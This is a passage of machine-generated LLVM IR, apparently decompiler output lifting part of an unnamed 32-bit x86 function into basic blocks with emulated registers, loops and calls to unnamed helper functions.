  store i32 %v3_8050c4c, i32* %v3_8050c50, align 4
  br label %dec_label_pc_8050ee4.backedge

dec_label_pc_8050c59:                             ; preds = %dec_label_pc_8050c0a, %dec_label_pc_8050c03
  %v0_8050c59 = call i32 @function_804fae4()
  store i32 %v0_8050c59, i32* %eax.global-to-local, align 4
  %v1_8050c5e = inttoptr i32 %v0_8050c59 to i32*
  store i32 1, i32* %v1_8050c5e, align 4
  br label %dec_label_pc_8050f1c

dec_label_pc_8050c69:                             ; preds = %dec_label_pc_8050bfa
  %v1_8050c69 = icmp eq i32 %v3_8050bfa, 0
  %v1_8050c6b = icmp eq i1 %v1_8050c69, false
  br i1 %v1_8050c6b, label %dec_label_pc_8050e78, label %dec_label_pc_8050c71

dec_label_pc_8050c71:                             ; preds = %dec_label_pc_8050c69
  %v1_8050c71 = add i32 %v0_8050be0, 120
  %v2_8050c71 = inttoptr i32 %v1_8050c71 to i32*
  %v3_8050c71 = load i32, i32* %v2_8050c71, align 4
  %tmp48 = icmp slt i32 %v3_8050c71, 1
  br i1 %tmp48, label %dec_label_pc_8050c81, label %dec_label_pc_8050c78

dec_label_pc_8050c78:                             ; preds = %dec_label_pc_8050c71
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_8050ca054 = add i32 %v0_8050be0, 116
  %v3_8050ca055 = inttoptr i32 %v2_8050ca054 to i32*
  %v4_8050ca056 = load i32, i32* %v3_8050ca055, align 4
  %v5_8050ca057 = sub i32 0, %v4_8050ca056
  %v13_8050ca061 = and i32 %v4_8050ca056, %v5_8050ca057
  %v14_8050ca062 = icmp slt i32 %v13_8050ca061, 0
  %v16_8050ca064 = icmp slt i32 %v5_8050ca057, 0
  %v2_8050ca465 = icmp eq i1 %v16_8050ca064, %v14_8050ca062
  br i1 %v2_8050ca465, label %dec_label_pc_8050ca6, label %dec_label_pc_8050c91

dec_label_pc_8050c81:                             ; preds = %dec_label_pc_8050c71
  %v0_8050c81 = call i32 @function_804fae4()
  store i32 %v0_8050c81, i32* %eax.global-to-local, align 4
  %v1_8050c86 = inttoptr i32 %v0_8050c81 to i32*
  store i32 4, i32* %v1_8050c86, align 4
  br label %dec_label_pc_8050f1c

dec_label_pc_8050c91:                             ; preds = %dec_label_pc_8050c78, %dec_label_pc_8050c91
  %v0_8050ca867 = phi i32 [ %v1_8050c9d, %dec_label_pc_8050c91 ], [ %v1_8050be0, %dec_label_pc_8050c78 ]
  %v0_8050c9166 = phi i32 [ %v0_8050c95, %dec_label_pc_8050c91 ], [ %v3_8050bfa, %dec_label_pc_8050c78 ]
  %v2_8050c91 = add i32 %v0_8050ca867, -4
  %v3_8050c91 = inttoptr i32 %v2_8050c91 to i32*
  store i32 %v0_8050c9166, i32* %v3_8050c91, align 4
  %v0_8050c92 = load i32, i32* @eax, align 4
  %v2_8050c92 = add i32 %v0_8050ca867, -8
  %v3_8050c92 = inttoptr i32 %v2_8050c92 to i32*
  store i32 %v0_8050c92, i32* %v3_8050c92, align 4
  %v0_8050c93 = load i32, i32* @esi, align 4
  %v2_8050c93 = add i32 %v0_8050ca867, -12
  %v3_8050c93 = inttoptr i32 %v2_8050c93 to i32*
  store i32 %v0_8050c93, i32* %v3_8050c93, align 4
  %v2_8050c94 = add i32 %v0_8050ca867, -16
  %v3_8050c94 = inttoptr i32 %v2_8050c94 to i32*
  store i32 %v1_8050876, i32* %v3_8050c94, align 4
  %v0_8050c95 = call i32 @function_8051de4()
  store i32 %v0_8050c95, i32* @eax, align 4
  %v0_8050c9a = load i32, i32* @ebx, align 4
  %v1_8050c9a = add i32 %v0_8050c9a, 1
  store i32 %v1_8050c9a, i32* @ebx, align 4
  %v0_8050c9b = load i32, i32* @esi, align 4
  %v2_8050c9b = add i32 %v0_8050c9b, %v0_8050c95
  store i32 %v2_8050c9b, i32* @esi, align 4
  %v0_8050c9d = load i32, i32* @esp, align 4
  %v1_8050c9d = add i32 %v0_8050c9d, 16
  %v2_8050ca0 = add i32 %v0_8050c9d, 116
  %v3_8050ca0 = inttoptr i32 %v2_8050ca0 to i32*
  %v4_8050ca0 = load i32, i32* %v3_8050ca0, align 4
  %v5_8050ca0 = sub i32 %v1_8050c9a, %v4_8050ca0
  %v11_8050ca0 = xor i32 %v4_8050ca0, %v1_8050c9a
  %v12_8050ca0 = xor i32 %v5_8050ca0, %v1_8050c9a
  %v13_8050ca0 = and i32 %v12_8050ca0, %v11_8050ca0
  %v14_8050ca0 = icmp slt i32 %v13_8050ca0, 0
  %v16_8050ca0 = icmp slt i32 %v5_8050ca0, 0
  %v2_8050ca4 = icmp eq i1 %v16_8050ca0, %v14_8050ca0
  br i1 %v2_8050ca4, label %dec_label_pc_8050ca6, label %dec_label_pc_8050c91

dec_label_pc_8050ca6:                             ; preds = %dec_label_pc_8050c91, %dec_label_pc_8050c78
  %v0_8050ca8.lcssa = phi i32 [ %v1_8050be0, %dec_label_pc_8050c78 ], [ %v1_8050c9d, %dec_label_pc_8050c91 ]
  store i32 0, i32* @ebx, align 4
  %v1_8050ca8 = add i32 %v0_8050ca8.lcssa, 27
  %v2_8050ca8 = inttoptr i32 %v1_8050ca8 to i8*
  store i8 1, i8* %v2_8050ca8, align 1
  %v0_8050dd6.pre = load i32, i32* @ebx, align 4
  %v1_8050dd6.pre = load i32, i32* @esp, align 4
  %v2_8050dd668 = add i32 %v1_8050dd6.pre, 104
  %v3_8050dd669 = inttoptr i32 %v2_8050dd668 to i32*
  %v4_8050dd670 = load i32, i32* %v3_8050dd669, align 4
  %v5_8050dd671 = sub i32 %v0_8050dd6.pre, %v4_8050dd670
  %v11_8050dd673 = xor i32 %v4_8050dd670, %v0_8050dd6.pre
  %v12_8050dd674 = xor i32 %v5_8050dd671, %v0_8050dd6.pre
  %v13_8050dd675 = and i32 %v12_8050dd674, %v11_8050dd673
  %v14_8050dd676 = icmp slt i32 %v13_8050dd675, 0
  %v16_8050dd678 = icmp slt i32 %v5_8050dd671, 0
  %v2_8050dda79 = icmp eq i1 %v16_8050dd678, %v14_8050dd676
  br i1 %v2_8050dda79, label %dec_label_pc_8050de6, label %dec_label_pc_8050ddc.lr.ph

dec_label_pc_8050ddc.lr.ph:                       ; preds = %dec_label_pc_8050ca6
  %v0_8050ddc.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050ddc

dec_label_pc_8050cb2:                             ; preds = %dec_label_pc_8050ddc
  %v1_8050cb2 = add i32 %v0_8050cb280, 116
  store i32 %v1_8050cb2, i32* %eax.global-to-local, align 4
  %v2_8050cb6 = add i32 %v0_8050cb280, -4
  %v3_8050cb6 = inttoptr i32 %v2_8050cb6 to i32*
  store i32 %v1_8050cb2, i32* %v3_8050cb6, align 4
  %v3_8050cb7 = load i32, i32* %v3_8050ddc, align 4
  %v5_8050cb7 = add i32 %v0_8050cb280, -8
  %v6_8050cb7 = inttoptr i32 %v5_8050cb7 to i32*
  store i32 %v3_8050cb7, i32* %v6_8050cb7, align 4
  %v0_8050cbb = load i32, i32* @esi, align 4
  %v2_8050cbb = add i32 %v0_8050cb280, -12
  %v3_8050cbb = inttoptr i32 %v2_8050cbb to i32*
  store i32 %v0_8050cbb, i32* %v3_8050cbb, align 4
  %v2_8050cbc = add i32 %v0_8050cb280, -16
  %v3_8050cbc = inttoptr i32 %v2_8050cbc to i32*
  store i32 %v1_8050876, i32* %v3_8050cbc, align 4
  %v0_8050cbd = call i32 @function_8051e04()
  store i32 %v0_8050cbd, i32* @eax, align 4
  %v1_8050cc2 = load i32, i32* @esp, align 4
  %v2_8050cc2 = add i32 %v1_8050cc2, 68
  %v3_8050cc2 = inttoptr i32 %v2_8050cc2 to i32*
  store i32 %v0_8050cbd, i32* %v3_8050cc2, align 4
  %v0_8050cc6 = load i32, i32* @esp, align 4
  %v1_8050cc6 = add i32 %v0_8050cc6, 16
  %v2_8050cc9 = icmp slt i32 %v0_8050cbd, 0
  %v1_8050ccb = icmp eq i1 %v2_8050cc9, false
  br i1 %v1_8050ccb, label %dec_label_pc_8050ce5, label %dec_label_pc_8050ccd

dec_label_pc_8050ccd:                             ; preds = %dec_label_pc_8050cb2
  %v0_8050ccd = load i32, i32* @ebx, align 4
  %v1_8050ccd = icmp eq i32 %v0_8050ccd, 0
  br i1 %v1_8050ccd, label %dec_label_pc_8050e78, label %dec_label_pc_8050cd5

dec_label_pc_8050cd5:                             ; preds = %dec_label_pc_8050ccd
  %v1_8050cd5 = add i32 %v0_8050cc6, 100
  %v2_8050cd5 = inttoptr i32 %v1_8050cd5 to i32*
  %v3_8050cd5 = load i32, i32* %v2_8050cd5, align 4
  %v4_8050cd5 = icmp eq i32 %v3_8050cd5, 0
  br i1 %v4_8050cd5, label %dec_label_pc_8050e78, label %dec_label_pc_8050de6

dec_label_pc_8050ce5:                             ; preds = %dec_label_pc_8050cb2
  %v1_8050ce5 = add i32 %v0_8050cc6, 43
  %v2_8050ce5 = inttoptr i32 %v1_8050ce5 to i8*
  %v3_8050ce5 = load i8, i8* %v2_8050ce5, align 1
  %v4_8050ce5 = icmp eq i8 %v3_8050ce5, 0
  br i1 %v4_8050ce5, label %dec_label_pc_8050d86, label %dec_label_pc_8050cf0

dec_label_pc_8050cf0:                             ; preds = %dec_label_pc_8050ce5
  %v0_8050cf0 = load i32, i32* @edi, align 4
  %v1_8050cf0 = add i32 %v0_8050cf0, 28
  %v2_8050cf0 = inttoptr i32 %v1_8050cf0 to i32*
  %v3_8050cf0 = load i32, i32* %v2_8050cf0, align 4
  store i32 %v3_8050cf0, i32* %eax.global-to-local, align 4
  %v2_8050cf3 = add i32 %v0_8050cc6, 160
  %v3_8050cf3 = inttoptr i32 %v2_8050cf3 to i32*
  store i32 %v3_8050cf0, i32* %v3_8050cf3, align 4
  %v0_8050cfa = load i32, i32* @edi, align 4
  %v1_8050cfa = add i32 %v0_8050cfa, 32
  %v2_8050cfa = inttoptr i32 %v1_8050cfa to i32*
  %v3_8050cfa = load i32, i32* %v2_8050cfa, align 4
  store i32 %v3_8050cfa, i32* %eax.global-to-local, align 4
  %v1_8050cfd = load i32, i32* @esp, align 4
  %v2_8050cfd = add i32 %v1_8050cfd, 148
  %v3_8050cfd = inttoptr i32 %v2_8050cfd to i32*
  store i32 %v3_8050cfa, i32* %v3_8050cfd, align 4
  %v0_8050d04 = load i32, i32* @edi, align 4
  %v1_8050d04 = add i32 %v0_8050d04, 36
  %v2_8050d04 = inttoptr i32 %v1_8050d04 to i32*
  %v3_8050d04 = load i32, i32* %v2_8050d04, align 4
  store i32 %v3_8050d04, i32* %eax.global-to-local, align 4
  %v1_8050d07 = load i32, i32* @esp, align 4
  %v2_8050d07 = add i32 %v1_8050d07, 152
  %v3_8050d07 = inttoptr i32 %v2_8050d07 to i32*
  store i32 %v3_8050d04, i32* %v3_8050d07, align 4
  %v0_8050d0e = load i32, i32* @ecx, align 4
  %v1_8050d0e = load i32, i32* @esp, align 4
  %v2_8050d0e = add i32 %v1_8050d0e, -4
  %v3_8050d0e = inttoptr i32 %v2_8050d0e to i32*
  store i32 %v0_8050d0e, i32* %v3_8050d0e, align 4
  %v1_8050d0f = add i32 %v1_8050d0e, -8
  %v2_8050d0f = inttoptr i32 %v1_8050d0f to i32*
  store i32 40, i32* %v2_8050d0f, align 4
  %v1_8050d11 = add i32 %v1_8050d0e, 116
  store i32 %v1_8050d11, i32* %edx.global-to-local, align 4
  %v2_8050d15 = add i32 %v1_8050d0e, -12
  %v3_8050d15 = inttoptr i32 %v2_8050d15 to i32*
  store i32 %v1_8050d11, i32* %v3_8050d15, align 4
  %v0_8050d16 = load i32, i32* @edi, align 4
  %v2_8050d16 = add i32 %v1_8050d0e, -16
  %v3_8050d16 = inttoptr i32 %v2_8050d16 to i32*
  store i32 %v0_8050d16, i32* %v3_8050d16, align 4
  %v5_8050d17 = call i32 @function_804d150(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050904, i32 %v3_8050963)
  store i32 %v5_8050d17, i32* %eax.global-to-local, align 4
  %v0_8050d1c = load i32, i32* @edi, align 4
  %v1_8050d1c = add i32 %v0_8050d1c, 4
  %v2_8050d1c = inttoptr i32 %v1_8050d1c to i32*
  %v3_8050d1c = load i32, i32* %v2_8050d1c, align 4
  store i32 %v3_8050d1c, i32* %eax.global-to-local, align 4
  %v0_8050d1f = load i32, i32* @esp, align 4
  %v1_8050d1f = add i32 %v0_8050d1f, 16
  %v9_8050d22 = icmp eq i32 %v3_8050d1c, 24
  br i1 %v9_8050d22, label %dec_label_pc_8050cf0.dec_label_pc_8050d49_crit_edge, label %dec_label_pc_8050d27

dec_label_pc_8050cf0.dec_label_pc_8050d49_crit_edge: ; preds = %dec_label_pc_8050cf0
  %.pre24 = add i32 %v0_8050d1f, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8050d49.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8050d49

dec_label_pc_8050d27:                             ; preds = %dec_label_pc_8050cf0
  %v1_8050d27 = add i32 %v0_8050d1c, 28
  %v2_8050d27 = inttoptr i32 %v1_8050d27 to i32*
  %v3_8050d27 = load i32, i32* %v2_8050d27, align 4
  %v4_8050d27 = icmp eq i32 %v3_8050d27, 0
  br i1 %v4_8050d27, label %dec_label_pc_8050de6, label %dec_label_pc_8050d31

dec_label_pc_8050d31:                             ; preds = %dec_label_pc_8050d27
  %v1_8050d31 = add i32 %v0_8050d1f, 260
  %v2_8050d31 = inttoptr i32 %v1_8050d31 to i32*
  %v3_8050d31 = load i32, i32* %v2_8050d31, align 4
  %v12_8050d31 = icmp eq i32 %v3_8050d31, 1
  br i1 %v12_8050d31, label %dec_label_pc_8050d49, label %dec_label_pc_8050d3b

dec_label_pc_8050d3b:                             ; preds = %dec_label_pc_8050d31
  %v12_8050d3b = icmp eq i32 %v3_8050d31, 28
  %v1_8050d43 = icmp eq i1 %v12_8050d3b, false
  br i1 %v1_8050d43, label %dec_label_pc_8050de6, label %dec_label_pc_8050d49

dec_label_pc_8050d49:                             ; preds = %dec_label_pc_8050cf0.dec_label_pc_8050d49_crit_edge, %dec_label_pc_8050d3b, %dec_label_pc_8050d31
  %v4_8050d49 = phi i32 [ %v4_8050d49.pre, %dec_label_pc_8050cf0.dec_label_pc_8050d49_crit_edge ], [ %v3_8050d31, %dec_label_pc_8050d3b ], [ 1, %dec_label_pc_8050d31 ]
  %v15_8050d49 = icmp eq i32 %v3_8050d1c, %v4_8050d49
  br i1 %v15_8050d49, label %dec_label_pc_8050d5e, label %dec_label_pc_8050d52

dec_label_pc_8050d52:                             ; preds = %dec_label_pc_8050d49
  %v1_8050d55 = inttoptr i32 %v0_8050d1c to i32*
  %v2_8050d55 = load i32, i32* %v1_8050d55, align 4
  %v5_8050d55 = inttoptr i32 %v0_8050d1f to i32*
  store i32 %v2_8050d55, i32* %v5_8050d55, align 4
  %v1_8050d57 = call i32 @function_804e725(i32 -1)
  store i32 %v1_8050d57, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050dce

dec_label_pc_8050d5e:                             ; preds = %dec_label_pc_8050d49
  %v0_8050d5e = load i32, i32* @ebx, align 4
  %v1_8050d60 = sub i32 -1, %v0_8050d5e
  store i32 %v1_8050d60, i32* %eax.global-to-local, align 4
  %v2_8050d62 = add i32 %v0_8050d1f, 120
  %v3_8050d62 = inttoptr i32 %v2_8050d62 to i32*
  %v4_8050d62 = load i32, i32* %v3_8050d62, align 4
  %v5_8050d62 = add i32 %v4_8050d62, %v1_8050d60
  store i32 %v5_8050d62, i32* %eax.global-to-local, align 4
  %v2_8050d66 = add i32 %v0_8050d1c, 36
  %v3_8050d66 = inttoptr i32 %v2_8050d66 to i32*
  store i32 %v5_8050d62, i32* %v3_8050d66, align 4
  %v0_8050d69 = load i32, i32* @edi, align 4
  %v1_8050d69 = add i32 %v0_8050d69, 16
  %v2_8050d69 = inttoptr i32 %v1_8050d69 to i32*
  %v3_8050d69 = load i32, i32* %v2_8050d69, align 4
  %v1_8050d6c = add i32 %v3_8050d69, 4
  store i32 %v1_8050d6c, i32* %eax.global-to-local, align 4
  %v2_8050d6f = add i32 %v0_8050d69, 36
  %v3_8050d6f = inttoptr i32 %v2_8050d6f to i32*
  %v4_8050d6f = load i32, i32* %v3_8050d6f, align 4
  %v7_8050d6f = mul i32 %v4_8050d6f, %v1_8050d6c
  store i32 %v7_8050d6f, i32* %eax.global-to-local, align 4
  %v2_8050d73 = add i32 %v0_8050d69, 32
  %v3_8050d73 = inttoptr i32 %v2_8050d73 to i32*
  %v4_8050d73 = load i32, i32* %v3_8050d73, align 4
  %v6_8050d76 = icmp ugt i32 %v7_8050d6f, %v4_8050d73
  br i1 %v6_8050d76, label %dec_label_pc_8050d5e.dec_label_pc_8050de6.loopexit_crit_edge, label %dec_label_pc_8050d78

dec_label_pc_8050d5e.dec_label_pc_8050de6.loopexit_crit_edge: ; preds = %dec_label_pc_8050d5e
  %v0_8050de6.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050de6

dec_label_pc_8050d78:                             ; preds = %dec_label_pc_8050d5e
  store i32 0, i32* %v3_8050d6f, align 4
  %v0_8050d7f = load i32, i32* @esp, align 4
  %v1_8050d7f = add i32 %v0_8050d7f, 27
  %v2_8050d7f = inttoptr i32 %v1_8050d7f to i8*
  store i8 0, i8* %v2_8050d7f, align 1
  %v1_8050dd1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050dd1

dec_label_pc_8050d86:                             ; preds = %dec_label_pc_8050ce5
  %v1_8050d89 = add i32 %v0_8050cc6, 132
  %v2_8050d89 = inttoptr i32 %v1_8050d89 to i32*
  %v3_8050d89 = load i32, i32* %v2_8050d89, align 4
  %v6_8050d89 = inttoptr i32 %v0_8050cc6 to i32*
  store i32 %v3_8050d89, i32* %v6_8050d89, align 4
  %v1_8050d90 = call i32 @function_804e725(i32 -1)
  store i32 %v1_8050d90, i32* %eax.global-to-local, align 4
  %v0_8050d95 = load i32, i32* @esp, align 4
  %v1_8050d95 = add i32 %v0_8050d95, 16
  %v1_8050d98 = add i32 %v0_8050d95, 260
  %v2_8050d98 = inttoptr i32 %v1_8050d98 to i32*
  %v3_8050d98 = load i32, i32* %v2_8050d98, align 4
  store i32 %v3_8050d98, i32* %eax.global-to-local, align 4
  %v1_8050d9f = add i32 %v0_8050d95, 136
  %v2_8050d9f = inttoptr i32 %v1_8050d9f to i32*
  %v3_8050d9f = load i32, i32* %v2_8050d9f, align 4
  %v15_8050d9f = icmp eq i32 %v3_8050d9f, %v3_8050d98
  %v1_8050da3 = icmp eq i1 %v15_8050d9f, false
  br i1 %v1_8050da3, label %dec_label_pc_8050dd1, label %dec_label_pc_8050da5

dec_label_pc_8050da5:                             ; preds = %dec_label_pc_8050d86
  %v0_8050da5 = load i32, i32* @edi, align 4
  %v1_8050da5 = add i32 %v0_8050da5, 16
  %v2_8050da5 = inttoptr i32 %v1_8050da5 to i32*
  %v3_8050da5 = load i32, i32* %v2_8050da5, align 4
  store i32 %v3_8050da5, i32* %eax.global-to-local, align 4
  %v2_8050da8 = add i32 %v0_8050d95, 148
  %v3_8050da8 = inttoptr i32 %v2_8050da8 to i32*
  %v4_8050da8 = load i32, i32* %v3_8050da8, align 4
  %v15_8050da8 = icmp eq i32 %v3_8050da5, %v4_8050da8
  %v1_8050daf = icmp eq i1 %v15_8050da8, false
  br i1 %v1_8050daf, label %dec_label_pc_8050e6b, label %dec_label_pc_8050db5

dec_label_pc_8050db5:                             ; preds = %dec_label_pc_8050da5
  %v0_8050db5 = load i32, i32* @edx, align 4
  %v2_8050db5 = add i32 %v0_8050d95, 12
  %v3_8050db5 = inttoptr i32 %v2_8050db5 to i32*
  store i32 %v0_8050db5, i32* %v3_8050db5, align 4
  %v0_8050db6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050db6 = add i32 %v0_8050d95, 8
  %v3_8050db6 = inttoptr i32 %v2_8050db6 to i32*
  store i32 %v0_8050db6, i32* %v3_8050db6, align 4
  %v1_8050db7 = add i32 %v0_8050d95, 152
  %v2_8050db7 = inttoptr i32 %v1_8050db7 to i32*
  %v3_8050db7 = load i32, i32* %v2_8050db7, align 4
  %v5_8050db7 = add i32 %v0_8050d95, 4
  %v6_8050db7 = inttoptr i32 %v5_8050db7 to i32*
  store i32 %v3_8050db7, i32* %v6_8050db7, align 4
  %v0_8050dbe = load i32, i32* %eax.global-to-local, align 4
  %v1_8050dbe = load i32, i32* @edi, align 4
  %v2_8050dbe = add i32 %v1_8050dbe, 36
  %v3_8050dbe = inttoptr i32 %v2_8050dbe to i32*
  %v4_8050dbe = load i32, i32* %v3_8050dbe, align 4
  %v7_8050dbe = mul i32 %v4_8050dbe, %v0_8050dbe
  store i32 %v7_8050dbe, i32* %eax.global-to-local, align 4
  %v2_8050dc2 = add i32 %v1_8050dbe, 28
  %v3_8050dc2 = inttoptr i32 %v2_8050dc2 to i32*
  %v4_8050dc2 = load i32, i32* %v3_8050dc2, align 4
  %v5_8050dc2 = add i32 %v4_8050dc2, %v7_8050dbe
  store i32 %v5_8050dc2, i32* %eax.global-to-local, align 4
  %v3_8050dc5 = inttoptr i32 %v0_8050d95 to i32*
  store i32 %v5_8050dc2, i32* %v3_8050dc5, align 4
  %v5_8050dc6 = call i32 @function_804d150(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050904, i32 %v3_8050963)
  store i32 %v5_8050dc6, i32* %eax.global-to-local, align 4
  %v0_8050dcb = load i32, i32* @edi, align 4
  %v1_8050dcb = add i32 %v0_8050dcb, 36
  %v2_8050dcb = inttoptr i32 %v1_8050dcb to i32*
  %v3_8050dcb = load i32, i32* %v2_8050dcb, align 4
  %v4_8050dcb = add i32 %v3_8050dcb, 1
  store i32 %v4_8050dcb, i32* %v2_8050dcb, align 4
  br label %dec_label_pc_8050dce

dec_label_pc_8050dce:                             ; preds = %dec_label_pc_8050d52, %dec_label_pc_8050db5
  %v0_8050dce = load i32, i32* @esp, align 4
  %v1_8050dce = add i32 %v0_8050dce, 16
  br label %dec_label_pc_8050dd1

dec_label_pc_8050dd1:                             ; preds = %dec_label_pc_8050d86, %dec_label_pc_8050d78, %dec_label_pc_8050dce
  %v1_8050dd1 = phi i32 [ %v1_8050d95, %dec_label_pc_8050d86 ], [ %v1_8050dd1.pre, %dec_label_pc_8050d78 ], [ %v1_8050dce, %dec_label_pc_8050dce ]
  %v0_8050dd1 = load i32, i32* @esi, align 4
  %v2_8050dd1 = add i32 %v1_8050dd1, 52
  %v3_8050dd1 = inttoptr i32 %v2_8050dd1 to i32*
  %v4_8050dd1 = load i32, i32* %v3_8050dd1, align 4
  %v5_8050dd1 = add i32 %v4_8050dd1, %v0_8050dd1
  store i32 %v5_8050dd1, i32* @esi, align 4
  %v0_8050dd5 = load i32, i32* @ebx, align 4
  %v1_8050dd5 = add i32 %v0_8050dd5, 1
  store i32 %v1_8050dd5, i32* @ebx, align 4
  %v2_8050dd6 = add i32 %v1_8050dd1, 104
  %v3_8050dd6 = inttoptr i32 %v2_8050dd6 to i32*
  %v4_8050dd6 = load i32, i32* %v3_8050dd6, align 4
  %v5_8050dd6 = sub i32 %v1_8050dd5, %v4_8050dd6
  %v11_8050dd6 = xor i32 %v4_8050dd6, %v1_8050dd5
  %v12_8050dd6 = xor i32 %v5_8050dd6, %v1_8050dd5
  %v13_8050dd6 = and i32 %v12_8050dd6, %v11_8050dd6
  %v14_8050dd6 = icmp slt i32 %v13_8050dd6, 0
  %v16_8050dd6 = icmp slt i32 %v5_8050dd6, 0
  %v2_8050dda = icmp eq i1 %v16_8050dd6, %v14_8050dd6
  br i1 %v2_8050dda, label %dec_label_pc_8050de6, label %dec_label_pc_8050ddc

dec_label_pc_8050ddc:                             ; preds = %dec_label_pc_8050ddc.lr.ph, %dec_label_pc_8050dd1
  %v0_8050ddc = phi i32 [ %v0_8050ddc.pre, %dec_label_pc_8050ddc.lr.ph ], [ %v5_8050dd1, %dec_label_pc_8050dd1 ]
  %v0_8050cb280 = phi i32 [ %v1_8050dd6.pre, %dec_label_pc_8050ddc.lr.ph ], [ %v1_8050dd1, %dec_label_pc_8050dd1 ]
  %v2_8050ddc = add i32 %v0_8050cb280, 16
  %v3_8050ddc = inttoptr i32 %v2_8050ddc to i32*
  %v4_8050ddc = load i32, i32* %v3_8050ddc, align 4
  %v5_8050ddc = sub i32 %v0_8050ddc, %v4_8050ddc
  %v11_8050ddc = xor i32 %v4_8050ddc, %v0_8050ddc
  %v12_8050ddc = xor i32 %v5_8050ddc, %v0_8050ddc
  %v13_8050ddc = and i32 %v12_8050ddc, %v11_8050ddc
  %v14_8050ddc = icmp slt i32 %v13_8050ddc, 0
  %v16_8050ddc = icmp slt i32 %v5_8050ddc, 0
  %v2_8050de0 = icmp eq i1 %v16_8050ddc, %v14_8050ddc
  br i1 %v2_8050de0, label %dec_label_pc_8050de6, label %dec_label_pc_8050cb2

dec_label_pc_8050de6:                             ; preds = %dec_label_pc_8050cd5, %dec_label_pc_8050ca6, %dec_label_pc_8050dd1, %dec_label_pc_8050d27, %dec_label_pc_8050d3b, %dec_label_pc_8050ddc, %dec_label_pc_8050d5e.dec_label_pc_8050de6.loopexit_crit_edge
  %v0_8050de6 = phi i32 [ %v0_8050de6.pre.pre, %dec_label_pc_8050d5e.dec_label_pc_8050de6.loopexit_crit_edge ], [ %v1_8050dd6.pre, %dec_label_pc_8050ca6 ], [ %v1_8050dd1, %dec_label_pc_8050dd1 ], [ %v1_8050d1f, %dec_label_pc_8050d27 ], [ %v1_8050d1f, %dec_label_pc_8050d3b ], [ %v0_8050cb280, %dec_label_pc_8050ddc ], [ %v1_8050cc6, %dec_label_pc_8050cd5 ]
  %v1_8050de9 = add i32 %v0_8050de6, 20
  %v2_8050de9 = inttoptr i32 %v1_8050de9 to i32*
  %v3_8050de9 = load i32, i32* %v2_8050de9, align 4
  %v5_8050de9 = add i32 %v0_8050de6, -16
  %v6_8050de9 = inttoptr i32 %v5_8050de9 to i32*
  store i32 %v3_8050de9, i32* %v6_8050de9, align 4
  %v1_8050ded = call i32 @function_804b4a4(i32 -1)
  store i32 %v1_8050ded, i32* %eax.global-to-local, align 4
  %v0_8050df2 = load i32, i32* @esp, align 4
  %v1_8050df5 = add i32 %v0_8050df2, 272
  %v2_8050df5 = inttoptr i32 %v1_8050df5 to i32*
  %v3_8050df5 = load i32, i32* %v2_8050df5, align 4
  %v4_8050df5 = icmp eq i32 %v3_8050df5, 0
  br i1 %v4_8050df5, label %dec_label_pc_8050e0a, label %dec_label_pc_8050dff

dec_label_pc_8050dff:                             ; preds = %dec_label_pc_8050de6
  store i32 %v3_8050df5, i32* %edx.global-to-local, align 4
  %v2_8050e06 = inttoptr i32 %v3_8050df5 to i32*
  store i32 %v1_8050876, i32* %v2_8050e06, align 4
  %v0_8050e16.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050e16

dec_label_pc_8050e0a:                             ; preds = %dec_label_pc_8050de6
  %v3_8050e0d = inttoptr i32 %v0_8050df2 to i32*
  store i32 %v1_8050876, i32* %v3_8050e0d, align 4
  %v1_8050e0e = call i32 @function_804e725(i32 -1)
  store i32 %v1_8050e0e, i32* %eax.global-to-local, align 4
  %v0_8050e13 = load i32, i32* @esp, align 4
  %v1_8050e13 = add i32 %v0_8050e13, 16
  br label %dec_label_pc_8050e16

dec_label_pc_8050e16:                             ; preds = %dec_label_pc_8050dff, %dec_label_pc_8050e0a
  %v0_8050e16 = phi i32 [ %v0_8050e16.pre, %dec_label_pc_8050dff ], [ %v1_8050e13, %dec_label_pc_8050e0a ]
  %v1_8050e19 = add i32 %v0_8050e16, 12
  %v2_8050e19 = inttoptr i32 %v1_8050e19 to i32*
  %v3_8050e19 = load i32, i32* %v2_8050e19, align 4
  %v5_8050e19 = add i32 %v0_8050e16, -16
  %v6_8050e19 = inttoptr i32 %v5_8050e19 to i32*
  store i32 %v3_8050e19, i32* %v6_8050e19, align 4
  %v1_8050e1d = call i32 @function_804e725(i32 -1)
  store i32 %v1_8050e1d, i32* @eax, align 4
  %v0_8050e22 = load i32, i32* @esp, align 4
  %v1_8050e25 = add i32 %v0_8050e22, 8
  %v2_8050e25 = inttoptr i32 %v1_8050e25 to i32*
  store i32 ptrtoint (i32* @global_var_8058768.194 to i32), i32* %v2_8050e25, align 4
  %v1_8050e2a = add i32 %v0_8050e22, 4
  %v2_8050e2a = inttoptr i32 %v1_8050e2a to i32*
  store i32 134541995, i32* %v2_8050e2a, align 4
  %v1_8050e2f = add i32 %v0_8050e22, 200
  store i32 %v1_8050e2f, i32* %ebx.global-to-local, align 4
  %v3_8050e36 = inttoptr i32 %v0_8050e22 to i32*
  store i32 %v1_8050e2f, i32* %v3_8050e36, align 4
  %v2_8050e37 = call i32 @function_804f2ae(i32 -1, i32 %v15_8050904)
  store i32 %v2_8050e37, i32* %eax.global-to-local, align 4
  %v0_8050e3c = load i32, i32* @esp, align 4
  %v1_8050e3c = inttoptr i32 %v0_8050e3c to i32*
  store i32 ptrtoint (i32* @global_var_8058768.194 to i32), i32* %v1_8050e3c, align 4
  %v1_8050e43 = call i32 @function_804f2ab(i32 -1)
  store i32 %v1_8050e43, i32* %eax.global-to-local, align 4
  %v0_8050e48 = load i32, i32* @esp, align 4
  %v1_8050e48 = add i32 %v0_8050e48, 56
  %v2_8050e48 = inttoptr i32 %v1_8050e48 to i32*
  %v3_8050e48 = load i32, i32* %v2_8050e48, align 4
  store i32 %v3_8050e48, i32* @eax, align 4
  %v1_8050e4c = add i32 %v0_8050e48, 72
  %v2_8050e4c = inttoptr i32 %v1_8050e4c to i32*
  %v3_8050e4c = load i32, i32* %v2_8050e4c, align 4
  store i32 %v3_8050e4c, i32* %edx.global-to-local, align 4
